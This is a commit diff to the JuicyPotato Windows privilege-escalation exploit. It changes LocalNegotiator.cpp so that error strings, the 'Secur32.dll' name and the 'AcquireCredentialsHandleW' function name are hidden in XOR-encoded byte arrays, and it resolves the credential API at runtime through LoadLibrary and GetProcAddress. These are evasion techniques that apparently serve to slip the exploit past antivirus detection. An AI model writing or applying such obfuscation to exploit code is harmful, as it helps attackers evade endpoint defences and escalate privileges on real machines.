a6ef942fe01decb0e9699edb483644a9c2764241
philipmao <philipp.mao@compass-security.com>
2020-09-17 10:59:09 -0400

    9th attempt

--- JuicyPotato/JuicyPotato/LocalNegotiator.cpp
+++ JuicyPotato/JuicyPotato/LocalNegotiator.cpp
@@ -21,11 +21,26 @@ void InitTokenContextBuffer(PSecBufferDesc pSecBufferDesc, PSecBuffer pSecBuffer
 int LocalNegotiator::handleType1(char * ntlmBytes, int len)
 {
 	
-	 char  hid_Error__YwNsZksXGr71[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x2c','\x2b','\x65','\x4','\x34','\x30','\x2c','\x37','\x20','\x6','\x37','\x20','\x21','\x20','\x2b','\x31','\x2c','\x24','\x29','\x36','\xd','\x24','\x2b','\x21','\x29','\x20','\x45'};
- char  k_bbz1H9GLD9Xb = '\x45';
-for( char  &x : hid_Error__YwNsZksXGr71){
-x = x ^ k_bbz1H9GLD9Xb;
+	 char  hid_Error__VwZ1kPvgGpNR[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x2c','\x2b','\x65','\x4','\x34','\x30','\x2c','\x37','\x20','\x6','\x37','\x20','\x21','\x20','\x2b','\x31','\x2c','\x24','\x29','\x36','\xd','\x24','\x2b','\x21','\x29','\x20','\x45'};
+ char k_MFnaqqLXj0kh = '\x45';
+for(int i = 0; i < sizeof(hid_Error__VwZ1kPvgGpNR) / sizeof(hid_Error__VwZ1kPvgGpNR[0]); i++){
+hid_Error__VwZ1kPvgGpNR[i] = hid_Error__VwZ1kPvgGpNR[i] ^ k_MFnaqqLXj0kh;
 }
+	typedef SECURITY_STATUS(__stdcall* _AcquireCredentialsHandleW)(PSECURITY_STRING pPrincipal,PSECURITY_STRING pPackage,unsigned long    fCredentialUse,void             *pvLogonId,void             *pAuthData,SEC_GET_KEY_FN   pGetKeyFn,void             *pvGetKeyArgument,PCredHandle      phCredential,PTimeStamp       ptsExpiry);
+	TCHAR  hid_Secur__kovfAQnfVJoL[] = {'\x16','\x20','\x26','\x30','\x37','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
+TCHAR k_SlJcLsQiVDIl = '\x45';
+for(int i = 0; i < sizeof(hid_Secur__kovfAQnfVJoL) / sizeof(hid_Secur__kovfAQnfVJoL[0]); i++){
+hid_Secur__kovfAQnfVJoL[i] = hid_Secur__kovfAQnfVJoL[i] ^ k_SlJcLsQiVDIl;
+}
+
+	HANDLE hid_hHandl_rQhzKNDjAPh7 = LoadLibrary(hid_Secur__kovfAQnfVJoL);
+	TCHAR  hid_Acquir_vkJxjfISzgk5[] = {'\x4','\x26','\x34','\x30','\x2c','\x37','\x20','\x6','\x37','\x20','\x21','\x20','\x2b','\x31','\x2c','\x24','\x29','\x36','\xd','\x24','\x2b','\x21','\x29','\x20','\x12','\x45'};
+TCHAR k_TJDotkTL7isG = '\x45';
+for(int i = 0; i < sizeof(hid_Acquir_vkJxjfISzgk5) / sizeof(hid_Acquir_vkJxjfISzgk5[0]); i++){
+hid_Acquir_vkJxjfISzgk5[i] = hid_Acquir_vkJxjfISzgk5[i] ^ k_TJDotkTL7isG;
+}
+
+	_AcquireCredentialsHandleW AcquireCredentialsHandle = (_AcquireCredentialsHandleW) GetProcAddress(hid_hHandl_rQhzKNDjAPh7, hid_Acquir_vkJxjfISzgk5);
 TCHAR lpPackageName[1024] = L"Negotiate";
 	TimeStamp ptsExpiry;
 
@@ -42,7 +57,7 @@ TCHAR lpPackageName[1024] = L"Negotiate";
 
 	if (status != SEC_E_OK)
 	{
-		printf(hid_Error__YwNsZksXGr71);
+		printf(hid_Error__VwZ1kPvgGpNR);
 		return -1;
 	}
 
@@ -75,10 +90,10 @@ TCHAR lpPackageName[1024] = L"Negotiate";
 int LocalNegotiator::handleType2(char * ntlmBytes, int len)
 {
 	
-	 char  hid_Buffer_HMHYXp7RSCYY[] = {'\x7','\x30','\x23','\x23','\x20','\x37','\x65','\x36','\x2c','\x3f','\x20','\x36','\x65','\x2c','\x2b','\x26','\x2a','\x28','\x35','\x24','\x31','\x2c','\x27','\x29','\x20','\x65','\x68','\x65','\x26','\x24','\x2b','\x62','\x31','\x65','\x37','\x20','\x35','\x29','\x24','\x26','\x20','\x45'};
- char  k_FPD7kd0y2HTe = '\x45';
-for( char  &x : hid_Buffer_HMHYXp7RSCYY){
-x = x ^ k_FPD7kd0y2HTe;
+	 char  hid_Buffer_Kghsc0ll8QyP[] = {'\x7','\x30','\x23','\x23','\x20','\x37','\x65','\x36','\x2c','\x3f','\x20','\x36','\x65','\x2c','\x2b','\x26','\x2a','\x28','\x35','\x24','\x31','\x2c','\x27','\x29','\x20','\x65','\x68','\x65','\x26','\x24','\x2b','\x62','\x31','\x65','\x37','\x20','\x35','\x29','\x24','\x26','\x20','\x45'};
+ char k_jwk70Xg33GcQ = '\x45';
+for(int i = 0; i < sizeof(hid_Buffer_Kghsc0ll8QyP) / sizeof(hid_Buffer_Kghsc0ll8QyP[0]); i++){
+hid_Buffer_Kghsc0ll8QyP[i] = hid_Buffer_Kghsc0ll8QyP[i] ^ k_jwk70Xg33GcQ;
 }
 char* newNtlmBytes = (char*)secServerBuffer.pvBuffer;
 	if (len >= secServerBuffer.cbBuffer) {
@@ -93,7 +108,7 @@ char* newNtlmBytes = (char*)secServerBuffer.pvBuffer;
 		}
 	}
 	else {
-		printf(hid_Buffer_HMHYXp7RSCYY);
+		printf(hid_Buffer_Kghsc0ll8QyP);
 	}
 
 	return 0;
